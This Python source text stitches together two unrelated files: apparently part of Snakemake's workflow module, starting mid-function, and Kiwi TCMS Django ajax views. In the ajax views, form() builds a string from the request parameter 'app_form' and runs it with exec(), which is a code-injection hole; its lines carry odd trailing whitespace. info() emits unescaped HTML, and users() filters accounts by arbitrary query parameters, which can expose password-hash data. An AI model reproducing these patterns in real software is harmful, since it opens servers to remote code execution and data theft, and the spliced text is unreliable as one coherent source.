                notemp=False,
                nodeps=False,
                cleanup_metadata=None,
                subsnakemake=None,
                updated_files=None,
                keep_target_files=False,
                allowed_rules=None,
                greediness=1.0,
                no_hooks=False):

        self.global_resources = dict() if resources is None else resources
        self.global_resources["_cores"] = cores
        self.global_resources["_nodes"] = nodes

        def rules(items):
            return map(self._rules.__getitem__, filter(self.is_rule, items))

        if keep_target_files:

            def files(items):
                return filterfalse(self.is_rule, items)
        else:

            def files(items):
                return map(os.path.relpath, filterfalse(self.is_rule, items))

        if not targets:
            targets = [self.first_rule
                       ] if self.first_rule is not None else list()
        if prioritytargets is None:
            prioritytargets = list()
        if forcerun is None:
            forcerun = list()

        priorityrules = set(rules(prioritytargets))
        priorityfiles = set(files(prioritytargets))
        forcerules = set(rules(forcerun))
        forcefiles = set(files(forcerun))
        targetrules = set(chain(rules(targets),
                                filterfalse(Rule.has_wildcards, priorityrules),
                                filterfalse(Rule.has_wildcards, forcerules)))
        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))
        if forcetargets:
            forcefiles.update(targetfiles)
            forcerules.update(targetrules)

        rules = self.rules
        if allowed_rules:
            rules = [rule for rule in rules if rule.name in set(allowed_rules)]

        if wait_for_files is not None:
            try:
                snakemake.io.wait_for_files(wait_for_files,
                                            latency_wait=latency_wait)
            except IOError as e:
                logger.error(str(e))
                return False

        dag = DAG(
            self, rules,
            dryrun=dryrun,
            targetfiles=targetfiles,
            targetrules=targetrules,
            forceall=forceall,
            forcefiles=forcefiles,
            forcerules=forcerules,
            priorityfiles=priorityfiles,
            priorityrules=priorityrules,
            ignore_ambiguity=ignore_ambiguity,
            force_incomplete=force_incomplete,
            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,
            notemp=notemp)

        self.persistence = Persistence(
            nolock=nolock,
            dag=dag,
            warn_only=dryrun or printrulegraph or printdag or summary or
            list_version_changes or list_code_changes or list_input_changes or
            list_params_changes)

        if cleanup_metadata:
            for f in cleanup_metadata:
                self.persistence.cleanup_metadata(f)
            return True

        dag.init()
        dag.check_dynamic()

        if unlock:
            try:
                self.persistence.cleanup_locks()
                logger.info("Unlocking working directory.")
                return True
            except IOError:
                logger.error("Error: Unlocking the directory {} failed. Maybe "
                             "you don't have the permissions?")
                return False
        try:
            self.persistence.lock()
        except IOError:
            logger.error(
                "Error: Directory cannot be locked. Please make "
                "sure that no other Snakemake process is trying to create "
                "the same files in the following directory:\n{}\n"
                "If you are sure that no other "
                "instances of snakemake are running on this directory, "
                "the remaining lock was likely caused by a kill signal or "
                "a power loss. It can be removed with "
                "the --unlock argument.".format(os.getcwd()))
            return False

        if self.subworkflows and not printdag and not printrulegraph:
            # backup globals
            globals_backup = dict(self.globals)
            # execute subworkflows
            for subworkflow in self.subworkflows:
                subworkflow_targets = subworkflow.targets(dag)
                updated = list()
                if subworkflow_targets:
                    logger.info(
                        "Executing subworkflow {}.".format(subworkflow.name))
                    if not subsnakemake(subworkflow.snakefile,
                                        workdir=subworkflow.workdir,
                                        targets=subworkflow_targets,
                                        updated_files=updated):
                        return False
                    dag.updated_subworkflow_files.update(subworkflow.target(f)
                                                         for f in updated)
                else:
                    logger.info("Subworkflow {}: Nothing to be done.".format(
                        subworkflow.name))
            if self.subworkflows:
                logger.info("Executing main workflow.")
            # rescue globals
            self.globals.update(globals_backup)

        dag.check_incomplete()
        dag.postprocess()

        if nodeps:
            missing_input = [f for job in dag.targetjobs for f in job.input
                             if dag.needrun(job) and not os.path.exists(f)]
            if missing_input:
                logger.error(
                    "Dependency resolution disabled (--nodeps) "
                    "but missing input "
                    "files detected. If this happens on a cluster, please make sure "
                    "that you handle the dependencies yourself or turn of "
                    "--immediate-submit. Missing input files:\n{}".format(
                        "\n".join(missing_input)))
                return False

        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)

        if printd3dag:
            dag.d3dag()
            return True
        elif printdag:
            print(dag)
            return True
        elif printrulegraph:
            print(dag.rule_dot())
            return True
        elif summary:
            print("\n".join(dag.summary(detailed=False)))
            return True
        elif detailed_summary:
            print("\n".join(dag.summary(detailed=True)))
            return True
        elif list_version_changes:
            items = list(
                chain(*map(self.persistence.version_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_code_changes:
            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_input_changes:
            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_params_changes:
            items = list(
                chain(*map(self.persistence.params_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True

        scheduler = JobScheduler(self, dag, cores,
                                 local_cores=local_cores,
                                 dryrun=dryrun,
                                 touch=touch,
                                 cluster=cluster,
                                 cluster_config=cluster_config,
                                 cluster_sync=cluster_sync,
                                 jobname=jobname,
                                 immediate_submit=immediate_submit,
                                 quiet=quiet,
                                 keepgoing=keepgoing,
                                 drmaa=drmaa,
                                 printreason=printreason,
                                 printshellcmds=printshellcmds,
                                 latency_wait=latency_wait,
                                 benchmark_repeats=benchmark_repeats,
                                 greediness=greediness)

        if not dryrun and not quiet:
            if len(dag):
                if cluster or cluster_sync or drmaa:
                    logger.resources_info(
                        "Provided cluster nodes: {}".format(nodes))
                else:
                    logger.resources_info("Provided cores: {}".format(cores))
                    logger.resources_info("Rules claiming more threads will be scaled down.")
                provided_resources = format_resources(resources)
                if provided_resources:
                    logger.resources_info(
                        "Provided resources: " + provided_resources)
                ignored_resources = format_resource_names(
                    set(resource for job in dag.needrun_jobs for resource in
                        job.resources_dict if resource not in resources))
                if ignored_resources:
                    logger.resources_info(
                        "Ignored resources: " + ignored_resources)
                logger.run_info("\n".join(dag.stats()))
            else:
                logger.info("Nothing to be done.")
        if dryrun and not len(dag):
            logger.info("Nothing to be done.")

        success = scheduler.schedule()

        if success:
            if dryrun:
                if not quiet and len(dag):
                    logger.run_info("\n".join(dag.stats()))
            elif stats:
                scheduler.stats.to_json(stats)
            if not dryrun and not no_hooks:
                self._onsuccess(logger.get_logfile())
            return True
        else:
            if not dryrun and not no_hooks:
                self._onerror(logger.get_logfile())
            return False

    def include(self, snakefile,
                overwrite_first_rule=False,
                print_compilation=False,
                overwrite_shellcmd=None):
        """
        Include a snakefile.
        """
        # check if snakefile is a path to the filesystem
        if not urllib.parse.urlparse(snakefile).scheme:
            if not os.path.isabs(snakefile) and self.included_stack:
                current_path = os.path.dirname(self.included_stack[-1])
                snakefile = os.path.join(current_path, snakefile)
            snakefile = os.path.abspath(snakefile)
        # else it could be an url.
        # at least we don't want to modify the path for clarity.

        if snakefile in self.included:
            logger.info("Multiple include of {} ignored".format(snakefile))
            return
        self.included.append(snakefile)
        self.included_stack.append(snakefile)

        global workflow

        workflow = self

        first_rule = self.first_rule
        code, linemap = parse(snakefile,
                              overwrite_shellcmd=self.overwrite_shellcmd)

        if print_compilation:
            print(code)

        # insert the current directory into sys.path
        # this allows to import modules from the workflow directory
        sys.path.insert(0, os.path.dirname(snakefile))

        self.linemaps[snakefile] = linemap
        exec(compile(code, snakefile, "exec"), self.globals)
        if not overwrite_first_rule:
            self.first_rule = first_rule
        self.included_stack.pop()

    def onsuccess(self, func):
        self._onsuccess = func

    def onerror(self, func):
        self._onerror = func

    def workdir(self, workdir):
        if self.overwrite_workdir is None:
            if not os.path.exists(workdir):
                os.makedirs(workdir)
            self._workdir = workdir
            os.chdir(workdir)

    def configfile(self, jsonpath):
        """ Update the global config with the given dictionary. """
        global config
        c = snakemake.io.load_configfile(jsonpath)
        update_config(config, c)
        update_config(config, self.overwrite_config)

    def ruleorder(self, *rulenames):
        self._ruleorder.add(*rulenames)

    def subworkflow(self, name, snakefile=None, workdir=None):
        sw = Subworkflow(self, name, snakefile, workdir)
        self._subworkflows[name] = sw
        self.globals[name] = sw.target

    def localrules(self, *rulenames):
        self._localrules.update(rulenames)

    def rule(self, name=None, lineno=None, snakefile=None):
        name = self.add_rule(name, lineno, snakefile)
        rule = self.get_rule(name)

        def decorate(ruleinfo):
            if ruleinfo.input:
                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])
            if ruleinfo.output:
                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])
            if ruleinfo.params:
                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])
            if ruleinfo.threads:
                if not isinstance(ruleinfo.threads, int):
                    raise RuleException("Threads value has to be an integer.",
                                        rule=rule)
                rule.resources["_cores"] = ruleinfo.threads
            if ruleinfo.resources:
                args, resources = ruleinfo.resources
                if args:
                    raise RuleException("Resources have to be named.")
                if not all(map(lambda r: isinstance(r, int),
                               resources.values())):
                    raise RuleException(
                        "Resources values have to be integers.",
                        rule=rule)
                rule.resources.update(resources)
            if ruleinfo.priority:
                if (not isinstance(ruleinfo.priority, int) and
                    not isinstance(ruleinfo.priority, float)):
                    raise RuleException("Priority values have to be numeric.",
                                        rule=rule)
                rule.priority = ruleinfo.priority
            if ruleinfo.version:
                rule.version = ruleinfo.version
            if ruleinfo.log:
                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])
            if ruleinfo.message:
                rule.message = ruleinfo.message
            if ruleinfo.benchmark:
                rule.benchmark = ruleinfo.benchmark
            rule.norun = ruleinfo.norun
            rule.docstring = ruleinfo.docstring
            rule.run_func = ruleinfo.func
            rule.shellcmd = ruleinfo.shellcmd
            ruleinfo.func.__name__ = "__{}".format(name)
            self.globals[ruleinfo.func.__name__] = ruleinfo.func
            setattr(rules, name, rule)
            return ruleinfo.func

        return decorate

    def docstring(self, string):
        def decorate(ruleinfo):
            ruleinfo.docstring = string
            return ruleinfo

        return decorate

    def input(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.input = (paths, kwpaths)
            return ruleinfo

        return decorate

    def output(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.output = (paths, kwpaths)
            return ruleinfo

        return decorate

    def params(self, *params, **kwparams):
        def decorate(ruleinfo):
            ruleinfo.params = (params, kwparams)
            return ruleinfo

        return decorate

    def message(self, message):
        def decorate(ruleinfo):
            ruleinfo.message = message
            return ruleinfo

        return decorate

    def benchmark(self, benchmark):
        def decorate(ruleinfo):
            ruleinfo.benchmark = benchmark
            return ruleinfo

        return decorate

    def threads(self, threads):
        def decorate(ruleinfo):
            ruleinfo.threads = threads
            return ruleinfo

        return decorate

    def resources(self, *args, **resources):
        def decorate(ruleinfo):
            ruleinfo.resources = (args, resources)
            return ruleinfo

        return decorate

    def priority(self, priority):
        def decorate(ruleinfo):
            ruleinfo.priority = priority
            return ruleinfo

        return decorate

    def version(self, version):
        def decorate(ruleinfo):
            ruleinfo.version = version
            return ruleinfo

        return decorate

    def log(self, *logs, **kwlogs):
        def decorate(ruleinfo):
            ruleinfo.log = (logs, kwlogs)
            return ruleinfo

        return decorate

    def shellcmd(self, cmd):
        def decorate(ruleinfo):
            ruleinfo.shellcmd = cmd
            return ruleinfo

        return decorate

    def norun(self):
        def decorate(ruleinfo):
            ruleinfo.norun = True
            return ruleinfo

        return decorate

    def run(self, func):
        return RuleInfo(func)

    @staticmethod
    def _empty_decorator(f):
        return f


class RuleInfo:
    def __init__(self, func):
        self.func = func
        self.shellcmd = None
        self.norun = False
        self.input = None
        self.output = None
        self.params = None
        self.message = None
        self.benchmark = None
        self.threads = None
        self.resources = None
        self.priority = None
        self.version = None
        self.log = None
        self.docstring = None


class Subworkflow:
    def __init__(self, workflow, name, snakefile, workdir):
        self.workflow = workflow
        self.name = name
        self._snakefile = snakefile
        self._workdir = workdir

    @property
    def snakefile(self):
        if self._snakefile is None:
            return os.path.abspath(os.path.join(self.workdir, "Snakefile"))
        if not os.path.isabs(self._snakefile):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                self._snakefile))
        return self._snakefile

    @property
    def workdir(self):
        workdir = "." if self._workdir is None else self._workdir
        if not os.path.isabs(workdir):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                workdir))
        return workdir

    def target(self, paths):
        if not_iterable(paths):
            return flag(os.path.join(self.workdir, paths), "subworkflow", self)
        return [self.target(path) for path in paths]

    def targets(self, dag):
        return [f for job in dag.jobs for f in job.subworkflow_input
                if job.subworkflow_input[f] is self]


class Rules:
    """ A namespace for rules so that they can be accessed via dot notation. """
    pass


def srcdir(path):
    """Return the absolute path, relative to the source directory of the current Snakefile."""
    if not workflow.included_stack:
        return None
    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)

# -*- coding: utf-8 -*-
"""
Shared functions for plan/case/run.

Most of these functions are use for Ajax.
"""
import datetime
import sys                    
import json
from distutils.util import strtobool

from django import http
from django.db.models import Q, Count
from django.contrib.auth.models import User
from django.core import serializers
from django.core.exceptions import ObjectDoesNotExist
from django.apps import apps
from django.forms import ValidationError
from django.http import Http404
from django.http import HttpResponse
from django.shortcuts import render
from django.views.decorators.http import require_GET
from django.views.decorators.http import require_POST

from tcms.signals import POST_UPDATE_SIGNAL
from tcms.management.models import Component, Build, Version
from tcms.management.models import Priority
from tcms.management.models import Tag
from tcms.management.models import EnvGroup, EnvProperty, EnvValue
from tcms.testcases.models import TestCase, Bug
from tcms.testcases.models import Category
from tcms.testcases.models import TestCaseStatus, TestCaseTag
from tcms.testcases.views import plan_from_request_or_none
from tcms.testplans.models import TestPlan, TestCasePlan, TestPlanTag
from tcms.testruns.models import TestRun, TestCaseRun, TestCaseRunStatus, TestRunTag
from tcms.core.helpers.comments import add_comment
from tcms.core.utils.validations import validate_bug_id


def check_permission(request, ctype):
    perm = '%s.change_%s' % tuple(ctype.split('.'))
    if request.user.has_perm(perm):
        return True
    return False


def strip_parameters(request_dict, skip_parameters):
    parameters = {}
    for key, value in request_dict.items():
        if key not in skip_parameters and value:
            parameters[str(key)] = value

    return parameters


@require_GET                    
def info(request):
    """Ajax responder for misc information"""

    objects = _InfoObjects(request=request, product_id=request.GET.get('product_id'))
    info_type = getattr(objects, request.GET.get('info_type'))

    if not info_type:
        return HttpResponse('Unrecognizable info-type')

    if request.GET.get('format') == 'ulli':
        field = request.GET.get('field', default='name')

        response_str = '<ul>'
        for obj_value in info_type().values(field):
            response_str += '<li>' + obj_value.get(field, None) + '</li>'
        response_str += '</ul>'

        return HttpResponse(response_str)

    return HttpResponse(serializers.serialize('json', info_type(), fields=('name', 'value')))


class _InfoObjects(object):

    def __init__(self, request, product_id=None):
        self.request = request
        try:
            self.product_id = int(product_id)
        except (ValueError, TypeError):
            self.product_id = 0

    def builds(self):
        try:
            is_active = strtobool(self.request.GET.get('is_active', default='False'))
        except (ValueError, TypeError):
            is_active = False

        return Build.objects.filter(product_id=self.product_id, is_active=is_active)

    def categories(self):
        return Category.objects.filter(product__id=self.product_id)

    def components(self):
        return Component.objects.filter(product__id=self.product_id)

    def env_groups(self):
        return EnvGroup.objects.all()

    def env_properties(self):
        if self.request.GET.get('env_group_id'):
            return EnvGroup.objects.get(id=self.request.GET['env_group_id']).property.all()
        return EnvProperty.objects.all()

    def env_values(self):
        return EnvValue.objects.filter(property__id=self.request.GET.get('env_property_id'))

    def users(self):
        query = strip_parameters(self.request.GET, skip_parameters=('info_type', 'field', 'format'))
        return User.objects.filter(**query)

    def versions(self):
        return Version.objects.filter(product__id=self.product_id)


@require_GET                    
def form(request):                    
    """Response get form ajax call, most using in dialog"""                    

    # The parameters in internal_parameters will delete from parameters
    internal_parameters = ['app_form', 'format']                    
    parameters = strip_parameters(request.GET, internal_parameters)                    
    q_app_form = request.GET.get('app_form')                    
    q_format = request.GET.get('format')                    
    if not q_format:                    
        q_format = 'p'                    

    if not q_app_form:                    
        return HttpResponse('Unrecognizable app_form')                    

    # Get the form
    q_app, q_form = q_app_form.split('.')[0], q_app_form.split('.')[1]                    
    exec('from tcms.%s.forms import %s as form' % (q_app, q_form))                    
    __import__('tcms.%s.forms' % q_app)                    
    q_app_module = sys.modules['tcms.%s.forms' % q_app]                    
    form_class = getattr(q_app_module, q_form)                    
    form_params = form_class(initial=parameters)                    

    # Generate the HTML and reponse
    html = getattr(form_params, 'as_' + q_format)                    
    return HttpResponse(html())                    


def tags(request):
    """ Get tags for TestPlan, TestCase or TestRun """

    tag_objects = _TagObjects(request)
    template_name, obj = tag_objects.get()

    q_tag = request.GET.get('tags')
    q_action = request.GET.get('a')

    if q_action:
        tag_actions = _TagActions(obj=obj, tag_name=q_tag)
        getattr(tag_actions, q_action)()

    all_tags = obj.tag.all().order_by('pk')
    test_plan_tags = TestPlanTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_plans=Count('tag')).order_by('tag')
    test_case_tags = TestCaseTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_cases=Count('tag')).order_by('tag')
    test_run_tags = TestRunTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_runs=Count('tag')).order_by('tag')

    plan_counter = _TagCounter('num_plans', test_plan_tags)
    case_counter = _TagCounter('num_cases', test_case_tags)
    run_counter = _TagCounter('num_runs', test_run_tags)

    for tag in all_tags:
        tag.num_plans = plan_counter.calculate_tag_count(tag)
        tag.num_cases = case_counter.calculate_tag_count(tag)
        tag.num_runs = run_counter.calculate_tag_count(tag)

    context_data = {
        'tags': all_tags,
        'object': obj,
    }
    return render(request, template_name, context_data)


class _TagObjects(object):
    """ Used for getting the chosen object(TestPlan, TestCase or TestRun) from the database """

    def __init__(self, request):
        """
        :param request: An HTTP GET request, containing the primary key
                        and the type of object to be selected
        :type request: HttpRequest
        """
        for obj in ['plan', 'case', 'run']:
            if request.GET.get(obj):
                self.object = obj
                self.object_pk = request.GET.get(obj)
                break

    def get(self):
        func = getattr(self, self.object)
        return func()

    def plan(self):
        return 'management/get_tag.html', TestPlan.objects.get(pk=self.object_pk)

    def case(self):
        return 'management/get_tag.html', TestCase.objects.get(pk=self.object_pk)

    def run(self):
        return 'run/get_tag.html', TestRun.objects.get(pk=self.object_pk)


class _TagActions(object):
    """ Used for performing the 'add' and 'remove' actions on a given tag """

    def __init__(self, obj, tag_name):
        """
        :param obj: the object for which the tag actions would be performed
        :type obj: either a :class:`tcms.testplans.models.TestPlan`,
                          a :class:`tcms.testcases.models.TestCase` or
                          a :class:`tcms.testruns.models.TestRun`
        :param tag_name: The name of the tag to be manipulated
        :type tag_name: str
        """
        self.obj = obj
        self.tag_name = tag_name

    def add(self):
        tag, _ = Tag.objects.get_or_create(name=self.tag_name)
        self.obj.add_tag(tag)

    def remove(self):
        tag = Tag.objects.get(name=self.tag_name)
        self.obj.remove_tag(tag)


class _TagCounter(object):
    """ Used for counting the number of times a tag is assigned to TestRun/TestCase/TestPlan """

    def __init__(self, key, test_tags):
        """
         :param key: either 'num_plans', 'num_cases', 'num_runs', depending on what you want count
         :type key: str
         :param test_tags: query set, containing the Tag->Object relationship, ordered by tag and
                            annotated by key
            e.g. TestPlanTag, TestCaseTag ot TestRunTag
         :type test_tags: QuerySet
        """
        self.key = key
        self.test_tags = iter(test_tags)
        self.counter = {'tag': 0}

    def calculate_tag_count(self, tag):
        """
        :param tag: the tag you do the counting for
        :type tag: :class:`tcms.management.models.Tag`
        :return: the number of times a tag is assigned to object
        :rtype: int
        """
        if self.counter['tag'] != tag.pk:
            try:
                self.counter = self.test_tags.__next__()
            except StopIteration:
                return 0

        if tag.pk == self.counter['tag']:
            return self.counter[self.key]
        return 0


def get_value_by_type(val, v_type):
    """
    Exampls:
    1. get_value_by_type('True', 'bool')
    (1, None)
    2. get_value_by_type('19860624 123059', 'datetime')
    (datetime.datetime(1986, 6, 24, 12, 30, 59), None)
    3. get_value_by_type('5', 'int')
    ('5', None)
    4. get_value_by_type('string', 'str')
    ('string', None)
    5. get_value_by_type('everything', 'None')
    (None, None)
    6. get_value_by_type('buggy', 'buggy')
    (None, 'Unsupported value type.')
    7. get_value_by_type('string', 'int')
    (None, "invalid literal for int() with base 10: 'string'")
    """
    value = error = None

    def get_time(time):
        date_time = datetime.datetime
        if time == 'NOW':
            return date_time.now()
        return date_time.strptime(time, '%Y%m%d %H%M%S')

    pipes = {
        # Temporary solution is convert all of data to str
        # 'bool': lambda x: x == 'True',
        'bool': lambda x: x == 'True' and 1 or 0,
        'datetime': get_time,
        'int': lambda x: str(int(x)),
        'str': lambda x: str(x),
        'None': lambda x: None,
    }
    pipe = pipes.get(v_type, None)
    if pipe is None:
        error = 'Unsupported value type.'
    else:
        try:
            value = pipe(val)
        except Exception as e:
            error = str(e)
    return value, error


def say_no(error_msg):
    ajax_response = {'rc': 1, 'response': error_msg}
    return HttpResponse(json.dumps(ajax_response))


def say_yes():
    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))


# Deprecated. Not flexible.
@require_POST
def update(request):
    """
    Generic approach to update a model,\n
    based on contenttype.
    """
    now = datetime.datetime.now()

    data = request.POST.copy()
    ctype = data.get("content_type")
    vtype = data.get('value_type', 'str')
    object_pk_str = data.get("object_pk")
    field = data.get('field')
    value = data.get('value')

    object_pk = [int(a) for a in object_pk_str.split(',')]

    if not field or not value or not object_pk or not ctype:
        return say_no(
            'Following fields are required - content_type, '
            'object_pk, field and value.')

    # Convert the value type
    # FIXME: Django bug here: update() keywords must be strings
    field = str(field)

    value, error = get_value_by_type(value, vtype)
    if error:
        return say_no(error)
    has_perms = check_permission(request, ctype)
    if not has_perms:
        return say_no('Permission Dinied.')

    model = apps.get_model(*ctype.split(".", 1))
    targets = model._default_manager.filter(pk__in=object_pk)

    if not targets:
        return say_no('No record found')
    if not hasattr(targets[0], field):
        return say_no('%s has no field %s' % (ctype, field))

    if hasattr(targets[0], 'log_action'):
        for t in targets:
            try:
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), value
                    )
                )
            except (AttributeError, User.DoesNotExist):
                pass
    objects_update(targets, **{field: value})

    if hasattr(model, 'mail_scene'):
        mail_context = model.mail_scene(
            objects=targets, field=field, value=value, ctype=ctype,
            object_pk=object_pk,
        )
        if mail_context:
            from tcms.core.utils.mailto import mailto

            mail_context['context']['user'] = request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    # Special hacking for updating test case run status
    if ctype == 'testruns.testcaserun' and field == 'case_run_status':
        for t in targets:
            field = 'close_date'
            t.log_action(
                who=request.user,
                action='Field %s changed from %s to %s.' % (
                    field, getattr(t, field), now
                )
            )
            if t.tested_by != request.user:
                field = 'tested_by'
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), request.user
                    )
                )

            field = 'assignee'
            try:
                assignee = t.assginee
                if assignee != request.user:
                    t.log_action(
                        who=request.user,
                        action='Field %s changed from %s to %s.' % (
                            field, getattr(t, field), request.user
                        )
                    )
                    # t.assignee = request.user
                t.save()
            except (AttributeError, User.DoesNotExist):
                pass
        targets.update(close_date=now, tested_by=request.user)
    return say_yes()


@require_POST
def update_case_run_status(request):
    """
    Update Case Run status.
    """
    now = datetime.datetime.now()

    data = request.POST.copy()
    ctype = data.get("content_type")
    vtype = data.get('value_type', 'str')
    object_pk_str = data.get("object_pk")
    field = data.get('field')
    value = data.get('value')

    object_pk = [int(a) for a in object_pk_str.split(',')]

    if not field or not value or not object_pk or not ctype:
        return say_no(
            'Following fields are required - content_type, '
            'object_pk, field and value.')

    # Convert the value type
    # FIXME: Django bug here: update() keywords must be strings
    field = str(field)

    value, error = get_value_by_type(value, vtype)
    if error:
        return say_no(error)
    has_perms = check_permission(request, ctype)
    if not has_perms:
        return say_no('Permission Dinied.')

    model = apps.get_model(*ctype.split(".", 1))
    targets = model._default_manager.filter(pk__in=object_pk)

    if not targets:
        return say_no('No record found')
    if not hasattr(targets[0], field):
        return say_no('%s has no field %s' % (ctype, field))

    if hasattr(targets[0], 'log_action'):
        for t in targets:
            try:
                t.log_action(
                    who=request.user,
                    action='Field {} changed from {} to {}.'.format(
                        field,
                        getattr(t, field),
                        TestCaseRunStatus.id_to_string(value),
                    )
                )
            except (AttributeError, User.DoesNotExist):
                pass
    objects_update(targets, **{field: value})

    if hasattr(model, 'mail_scene'):
        from tcms.core.utils.mailto import mailto

        mail_context = model.mail_scene(
            objects=targets, field=field, value=value, ctype=ctype,
            object_pk=object_pk,
        )
        if mail_context:
            mail_context['context']['user'] = request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    # Special hacking for updating test case run status
    if ctype == 'testruns.testcaserun' and field == 'case_run_status':
        for t in targets:
            field = 'close_date'
            t.log_action(
                who=request.user,
                action='Field %s changed from %s to %s.' % (
                    field, getattr(t, field), now
                )
            )
            if t.tested_by != request.user:
                field = 'tested_by'
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), request.user
                    )
                )

            field = 'assignee'
            try:
                assignee = t.assginee
                if assignee != request.user:
                    t.log_action(
                        who=request.user,
                        action='Field %s changed from %s to %s.' % (
                            field, getattr(t, field), request.user
                        )
                    )
                    # t.assignee = request.user
                t.save()
            except (AttributeError, User.DoesNotExist):
                pass
        targets.update(close_date=now, tested_by=request.user)

    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))


class ModelUpdateActions(object):
    """Abstract class defining interfaces to update a model properties"""


class TestCaseUpdateActions(ModelUpdateActions):
    """Actions to update each possible proprety of TestCases

    Define your own method named _update_[property name] to hold specific
    update logic.
    """

    ctype = 'testcases.testcase'

    def __init__(self, request):
        self.request = request
        self.target_field = request.POST.get('target_field')
        self.new_value = request.POST.get('new_value')

    def get_update_action(self):
        return getattr(self, '_update_%s' % self.target_field, None)

    def update(self):
        has_perms = check_permission(self.request, self.ctype)
        if not has_perms:
            return say_no("You don't have enough permission to update TestCases.")

        action = self.get_update_action()
        if action is not None:
            try:
                resp = action()
                self._sendmail()
            except ObjectDoesNotExist as err:
                return say_no(str(err))
            except Exception:
                # TODO: besides this message to users, what happening should be
                # recorded in the system log.
                return say_no('Update failed. Please try again or request '
                              'support from your organization.')
            else:
                if resp is None:
                    resp = say_yes()
                return resp
        return say_no('Not know what to update.')

    def get_update_targets(self):
        """Get selected cases to update their properties"""
        case_ids = map(int, self.request.POST.getlist('case'))
        self._update_objects = TestCase.objects.filter(pk__in=case_ids)
        return self._update_objects

    def get_plan(self, pk_enough=True):
        try:
            return plan_from_request_or_none(self.request, pk_enough)
        except Http404:
            return None

    def _sendmail(self):
        mail_context = TestCase.mail_scene(objects=self._update_objects,
                                           field=self.target_field,
                                           value=self.new_value)
        if mail_context:
            from tcms.core.utils.mailto import mailto

            mail_context['context']['user'] = self.request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    def _update_priority(self):
        exists = Priority.objects.filter(pk=self.new_value).exists()
        if not exists:
            raise ObjectDoesNotExist('The priority you specified to change '
                                     'does not exist.')
        self.get_update_targets().update(**{str(self.target_field): self.new_value})

    def _update_default_tester(self):
        try:
            user = User.objects.get(Q(username=self.new_value) | Q(email=self.new_value))
        except User.DoesNotExist:
            raise ObjectDoesNotExist('Default tester not found!')
        self.get_update_targets().update(**{str(self.target_field): user.pk})

    def _update_case_status(self):
        try:
            new_status = TestCaseStatus.objects.get(pk=self.new_value)
        except TestCaseStatus.DoesNotExist:
            raise ObjectDoesNotExist('The status you choose does not exist.')

        update_object = self.get_update_targets()
        if not update_object:
            return say_no('No record(s) found')

        for testcase in update_object:
            if hasattr(testcase, 'log_action'):
                testcase.log_action(
                    who=self.request.user,
                    action='Field %s changed from %s to %s.' % (
                        self.target_field, testcase.case_status, new_status.name
                    )
                )
        update_object.update(**{str(self.target_field): self.new_value})

        # ###
        # Case is moved between Cases and Reviewing Cases tabs accoding to the
        # change of status. Meanwhile, the number of cases with each status
        # should be updated also.

        try:
            plan = plan_from_request_or_none(self.request)
        except Http404:
            return say_no("No plan record found.")
        else:
            if plan is None:
                return say_no('No plan record found.')

        confirm_status_name = 'CONFIRMED'
        plan.run_case = plan.case.filter(case_status__name=confirm_status_name)
        plan.review_case = plan.case.exclude(case_status__name=confirm_status_name)
        run_case_count = plan.run_case.count()
        case_count = plan.case.count()
        # FIXME: why not calculate review_case_count or run_case_count by using
        # substraction, which saves one SQL query.
        review_case_count = plan.review_case.count()

        return http.JsonResponse({
            'rc': 0, 'response': 'ok',
            'run_case_count': run_case_count,
            'case_count': case_count,
            'review_case_count': review_case_count,
        })

    def _update_sortkey(self):
        try:
            sortkey = int(self.new_value)
            if sortkey < 0 or sortkey > 32300:
                return say_no('New sortkey is out of range [0, 32300].')
        except ValueError:
            return say_no('New sortkey is not an integer.')
        plan = plan_from_request_or_none(self.request, pk_enough=True)
        if plan is None:
            return say_no('No plan record found.')
        update_targets = self.get_update_targets()

        # ##
        # MySQL does not allow to exeucte UPDATE statement that contains
        # subquery querying from same table. In this case, OperationError will
        # be raised.
        offset = 0
        step_length = 500
        queryset_filter = TestCasePlan.objects.filter
        data = {self.target_field: sortkey}
        while 1:
            sub_cases = update_targets[offset:offset + step_length]
            case_pks = [case.pk for case in sub_cases]
            if len(case_pks) == 0:
                break
            queryset_filter(plan=plan, case__in=case_pks).update(**data)
            # Move to next batch of cases to change.
            offset += step_length

    def _update_reviewer(self):
        reviewers = User.objects.filter(username=self.new_value).values_list('pk', flat=True)
        if not reviewers:
            err_msg = 'Reviewer %s is not found' % self.new_value
            raise ObjectDoesNotExist(err_msg)
        self.get_update_targets().update(**{str(self.target_field): reviewers[0]})


# NOTE: what permission is necessary
# FIXME: find a good chance to map all TestCase property change request to this
@require_POST
def update_cases_default_tester(request):
    """Update default tester upon selected TestCases"""
    proxy = TestCaseUpdateActions(request)
    return proxy.update()


update_cases_priority = update_cases_default_tester
update_cases_case_status = update_cases_default_tester
update_cases_sortkey = update_cases_default_tester
